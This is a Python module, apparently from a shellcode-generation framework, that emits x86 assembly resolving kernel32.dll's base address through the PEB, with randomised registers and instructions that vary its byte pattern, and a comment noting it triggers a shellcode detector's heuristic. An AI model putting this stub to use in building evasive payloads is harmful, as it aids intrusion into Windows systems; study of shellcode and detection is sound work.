#!/usr/bin/python

"""
PEB-based kernel32.dll base address resolution

NOTE: This is included for the sake of completeness, it triggers NEMU's kernel32.dll heuristic
"""

from random import choice

from payload_modules.kernel32.kernel32_base_resolution import kernel32_base_resolution
from arch.core import word_keywords, arch_registers, data_regs
from utils.bytework import bytes_to_asm

class payload_kernel32_peb(kernel32_base_resolution):

	def base_resolution_stub(self, base_reg):
		word_keyword = word_keywords[self.bits]

		null_instructions = ['XOR', 'SUB']
		null_instr = choice(null_instructions)

		regs = arch_registers(self.arch, self.bits)		
		src_reg = regs.random_gp_reg(False, [base_reg])

		# src_reg = 0x30
		# MOV base_reg, DWORD PTR FS:[src_reg]
		peb_instr = bytes_to_asm("\x64\x8B" + chr(8 * regs.gp_reg_to_opcode_index(base_reg) + regs.gp_reg_to_opcode_index(src_reg)))

		variables = {'src_reg': src_reg, 'peb_instr': peb_instr, 'base_reg': base_reg, 'word_keyword': word_keyword, 'null_instr': null_instr}

  		listing = '''
	{null_instr} {base_reg}, {base_reg}
	MOV {src_reg}, 0x30
	{peb_instr}													; PEB pointer
	MOV {base_reg}, {word_keyword} PTR [{base_reg} + 0x0C]		; PEB->Ldr
	MOV {base_reg}, {word_keyword} PTR [{base_reg} + 0x14]		; PEB->Ldr.InMemoryOrderModuleList.Flink
	MOV {base_reg}, {word_keyword} PTR [{base_reg}]				; First entry
	MOV {base_reg}, {word_keyword} PTR [{base_reg}]				; Second entry (kernel32.dll)
	MOV {base_reg}, {word_keyword} PTR [{base_reg} + 0x10]		; Image base
'''

		return listing.format(**variables)

	#
	# Override since we don't need this for PEB method
	#
	def to_kernel32_stub(self, base_reg_in, base_reg_out):
		variables = {'base_reg_in': base_reg_in, 'base_reg_out': base_reg_out}
		return "MOV {base_reg_out}, {base_reg_in}".format(**variables)

	#
	# Override since we don't need this for PEB method
	#
	def find_function_stub(self):
		return ""